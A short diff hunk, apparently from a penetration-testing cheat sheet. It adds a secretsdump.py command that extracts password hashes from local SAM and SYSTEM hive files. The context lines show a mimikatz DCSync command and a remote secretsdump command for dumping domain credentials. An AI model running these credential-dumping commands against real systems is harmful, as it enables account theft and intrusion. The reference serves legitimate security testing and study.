@@ -5959,6 +5959,7 @@ lsadump::dcsync /domain:testlab.local /user:Administrator
 
 ```c
 secretsdump.py -dc-ip IP DOMAIN/USER:PASS@IP
+secretsdump.py -sam sam -system system LOCAL
 ```
 
 ##### Persistence
